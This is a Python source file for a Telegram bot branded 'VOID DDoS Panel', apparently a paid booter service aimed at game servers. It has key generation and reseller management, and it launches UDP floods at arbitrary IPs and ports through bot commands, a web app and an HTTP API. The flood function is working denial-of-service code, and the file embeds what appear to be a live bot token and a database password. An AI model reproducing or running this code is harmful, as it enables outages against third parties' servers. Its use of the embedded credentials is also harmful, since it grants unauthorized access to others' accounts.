import os
import telebot
import hashlib
import time
import random
import string
import threading
import socket
import json
import base64
from datetime import datetime, timedelta
from telebot.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- CONFIGURATION ---
BOT_TOKEN = "9140144574:AAFcKO6bcCzNFXRgZ9c-JzUI17VWmVBvm5E" # <-- PUT YOUR NEW TOKEN HERE
ADMIN_ID = 6145515318  
WEB_APP_URL = "https://sastalootalerts.github.io/void-panel/" 
MONGO_URI = "mongodb+srv://studywithalkaish_db_user:otBv3I4WnjcPttCU@cluster0.yuzsiy0.mongodb.net/?retryWrites=true&w=majority"

bot = telebot.TeleBot(BOT_TOKEN)

# ─── DATABASE (MONGODB) ────────────────────────────────────────────────────────
mongo_client = MongoClient(MONGO_URI)
db = mongo_client.void_ddos
keys_col = db.keys
attacks_col = db.attacks
resellers_col = db.resellers

def generate_key(plan="VIP", days=30, reseller_id=None):
    uid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    salt = ''.join(random.choices(string.ascii_letters, k=5))
    raw = f"BGMI-{uid}-{int(time.time())}-VOID"
    h = hashlib.sha256(raw.encode()).hexdigest()[:6].upper()
    key = f"BGMI{plan}{uid}>{h}-{salt}"
    
    keys_col.insert_one({
        "key": key,
        "plan": plan,
        "created_at": int(time.time()),
        "expires_at": int(time.time()) + (days * 86400),
        "reseller_id": reseller_id
    })
    return key

def validate_key_db(key):
    row = keys_col.find_one({"key": key})
    if not row:
        return {"valid": False, "reason": "Key not found"}
    if row["expires_at"] < int(time.time()):
        return {"valid": False, "reason": "Key expired"}
    
    expiry_dt = datetime.fromtimestamp(row["expires_at"])
    return {
        "valid": True,
        "plan": row["plan"],
        "expiry": expiry_dt.strftime("%Y-%m-%d %H:%M:%S"),
        "days_left": max(0, (row["expires_at"] - int(time.time())) // 86400)
    }

# ─── ACTIVE JOBS ───────────────────────────────────────────────────────────────
active_jobs = {}
MAX_SLOTS = 10

def flood_job(job_id, ip, port, duration):
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytes(random.getrandbits(8) for _ in range(1024))
    count = 0
    while time.time() < end:
        try:
            sock.sendto(payload, (ip, port))
            count += 1
            if count % 5000 == 0:
                payload = bytes(random.getrandbits(8) for _ in range(1024))
        except:
            break
    sock.close()
    active_jobs.pop(job_id, None)

def launch_attack_internal(key, ip, port, duration):
    if len(active_jobs) >= MAX_SLOTS:
        return {"status": "slots_full", "active": len(active_jobs)}
        
    job_id = f"{ip}:{port}:{time.time()}"
    t = threading.Thread(target=flood_job, args=(job_id, ip, port, duration))
    t.daemon = True
    t.start()
    
    active_jobs[job_id] = {
        "ip": ip, "port": port, "duration": duration,
        "started": time.time(), "key": key
    }
    
    attacks_col.insert_one({
        "key": key, "ip": ip, "port": port, 
        "duration": duration, "started_at": int(time.time())
    })
    
    return {"status": "launched", "active": len(active_jobs), "max": MAX_SLOTS}

# ─── TELEGRAM COMMANDS ─────────────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def start(msg):
    parts = msg.text.split()
    
    if len(parts) > 1 and parts[1].startswith("atk_"):
        try:
            payload = parts[1].replace("atk_", "")
            decoded = base64.b64decode(payload).decode('utf-8')
            ip, port, duration, key = decoded.split(":")
            
            port = int(port)
            duration = min(int(duration), 300)

            v = validate_key_db(key)
            if not v["valid"]:
                bot.reply_to(msg, f"❌ Invalid Key: {v['reason']}")
                return

            result = launch_attack_internal(key, ip, port, duration)
            
            if result["status"] == "launched":
                bot.reply_to(msg, f"🚀 *Attack Launched*\nTarget: `{ip}:{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
            else:
                bot.reply_to(msg, f"❌ Error: {result['status']}")
        except Exception as e:
            bot.reply_to(msg, f"❌ Failed: {e}")
        return

    bot.reply_to(msg, """
🔥 *VOID DDoS Panel*
━━━━━━━━━━━━━━━━━━━━
`/panel` — open the Web App interface
`/genkey [days] [plan]` — generate key (admin)
`/checkkey [key]` — check key validity
`/attack [ip] [port] [seconds]` — launch attack (admin)
`/slots` — view active slots
`/addreseller [user_id]` — add reseller (admin)
`/stats` — panel statistics (admin)
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

@bot.message_handler(commands=['panel'])
def open_panel(msg):
    markup = InlineKeyboardMarkup()
    web_app = WebAppInfo(url=WEB_APP_URL)
    markup.add(InlineKeyboardButton("🚀 Open Panel", web_app=web_app))
    bot.reply_to(msg, "Tap below to launch the web interface:", reply_markup=markup)

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(msg):
    try:
        data = json.loads(msg.web_app_data.data)
        if data.get("action") != "launch":
            return
            
        key = data.get("key")
        ip = data.get("ip")
        port = int(data.get("port", 80))
        duration = min(int(data.get("duration", 60)), 300)

        v = validate_key_db(key)
        if not v["valid"]:
            bot.send_message(msg.chat.id, f"❌ Invalid Key: {v['reason']}")
            return

        result = launch_attack_internal(key, ip, port, duration)
        
        if result["status"] == "launched":
            bot.send_message(msg.chat.id, f"🚀 *Attack Launched*\nTarget: `{ip}:{port}`\nDuration: `{duration}s`\nSlots: `{result['active']}/{result['max']}`", parse_mode="Markdown")
        else:
            bot.send_message(msg.chat.id, f"❌ Error: Slots Full ({result['active']}/{result['max']})")
            
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Crash: {e}")

@bot.message_handler(commands=['launch'])
def launch_command(msg):
    parts = msg.text.split()
    if len(parts) < 5:
        bot.reply_to(msg, "❌ Invalid format. Use the Web App to generate the command.")
        return

    try:
        ip = parts[1]
        port = int(parts[2])
        duration = min(int(parts[3]), 300)
        key = parts[4]

        v = validate_key_db(key)
        if not v["valid"]:
            bot.reply_to(msg, f"❌ Invalid Key: {v['reason']}")
            return

        result = launch_attack_internal(key, ip, port, duration)
        
        if result["status"] == "launched":
            bot.reply_to(msg, f"🚀 *Attack Launched*\nTarget: `{ip}:{port}`\nDuration: `{duration}s`\nActive Slots: `{result['active']}/{result['max']}`", parse_mode="Markdown")
        else:
            bot.reply_to(msg, f"❌ Error: {result['status']}")
            
    except Exception as e:
        bot.reply_to(msg, f"❌ Failed: {e}")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    if msg.from_user.id != ADMIN_ID:
        r = resellers_col.find_one({"user_id": msg.from_user.id})
        if not r:
            bot.reply_to(msg, "❌ No permission.")
            return

    parts = msg.text.split()
    days = int(parts[1]) if len(parts) > 1 else 30
    plan = parts[2].upper() if len(parts) > 2 else "VIP"

    key = generate_key(plan=plan, days=days, reseller_id=msg.from_user.id)
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

    bot.reply_to(msg, f"""
✅ *Key Generated*
━━━━━━━━━━━━━━━━━━━━
🔑 `{key}`
📋 Plan: `{plan}`
📅 Expires: `{expiry}` ({days} days)
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

@bot.message_handler(commands=['checkkey'])
def checkkey(msg):
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "Usage: /checkkey [key]")
        return
    result = validate_key_db(parts[1])
    if result["valid"]:
        bot.reply_to(msg, f"""
✅ *Key Valid*
━━━━━━━━━━━━━━━━━━━━
🔑 `{parts[1]}`
📋 Plan: `{result['plan']}`
📅 Expires: `{result['expiry']}`
⏳ Days Left: `{result['days_left']}`
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")
    else:
        bot.reply_to(msg, f"❌ Invalid: {result['reason']}")

@bot.message_handler(commands=['attack'])
def attack(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only.")
        return
    parts = msg.text.split()
    if len(parts) < 4:
        bot.reply_to(msg, "Usage: /attack [ip] [port] [seconds]")
        return
    ip = parts[1]
    port = int(parts[2])
    duration = min(int(parts[3]), 300)

    result = launch_attack_internal("ADMIN", ip, port, duration)
    status = result["status"]

    if status == "launched":
        bot.reply_to(msg, f"""
🚀 *Attack Launched*
━━━━━━━━━━━━━━━━━━━━
🎯 Target: `{ip}:{port}`
⏱ Duration: `{duration}s`
📊 Active Slots: `{result['active']}/{result['max']}`
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")
    else:
        bot.reply_to(msg, f"❌ {status}")

@bot.message_handler(commands=['slots'])
def slots(msg):
    active = len(active_jobs)
    job_list = ""
    for jid, j in list(active_jobs.items()):
        elapsed = int(time.time() - j["started"])
        remaining = max(0, j["duration"] - elapsed)
        job_list += f"  • `{j['ip']}:{j['port']}` — {remaining}s left\n"

    bot.reply_to(msg, f"""
📊 *Live Slot Telemetry*
━━━━━━━━━━━━━━━━━━━━
Active: `{active} / {MAX_SLOTS}`
{job_list if job_list else "  No active jobs"}
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only.")
        return
        
    total_keys = keys_col.count_documents({})
    total_attacks = attacks_col.count_documents({})
    
    bot.reply_to(msg, f"""
📈 *Panel Statistics*
━━━━━━━━━━━━━━━━━━━━
🔑 Total Keys: `{total_keys}`
🚀 Total Attacks: `{total_attacks}`
📊 Live Slots: `{len(active_jobs)}/{MAX_SLOTS}`
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "Usage: /addreseller [user_id]")
        return
    uid = int(parts[1])
    resellers_col.update_one({"user_id": uid}, {"$set": {"user_id": uid}}, upsert=True)
    bot.reply_to(msg, f"✅ Reseller `{uid}` added.", parse_mode="Markdown")

# ─── HTTP API SERVER (for Android app) ─────────────────────────────────────────

class ApiHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = json.loads(self.rfile.read(length))

        if self.path == "/validate":
            key = body.get("key", "")
            result = validate_key_db(key)
            self._respond(result)

        elif self.path == "/launch":
            key = body.get("key", "")
            v = validate_key_db(key)
            if not v["valid"]:
                self._respond({"status": "invalid_key"})
                return
            ip = body.get("ip", "")
            port = int(body.get("port", 0))
            duration = min(int(body.get("duration", 30)), 300)
            result = launch_attack_internal(key, ip, port, duration)
            self._respond(result)

        else:
            self._respond({"error": "not found"}, 404)

    def do_GET(self):
        if self.path == "/slots":
            self._respond({
                "active": len(active_jobs),
                "max": MAX_SLOTS,
                "jobs": [
                    {"ip": j["ip"], "port": j["port"],
                     "remaining": max(0, j["duration"] -
                                     int(time.time() - j["started"]))}
                    for j in active_jobs.values()
                ]
            })
        else:
            self._respond({"error": "not found"}, 404)

    def _respond(self, data, code=200):
        resp = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(resp))
        self.end_headers()
        self.wfile.write(resp)

def run_api():
    # Render dynamic port deta hai, usko fetch karo
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), ApiHandler)
    server.serve_forever()
# ─── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    api_thread = threading.Thread(target=run_api)
    api_thread.daemon = True
    api_thread.start()
    print("[*] API server running on :8080", flush=True)
    print("[*] Telegram bot polling with MongoDB...", flush=True)
    bot.infinity_polling()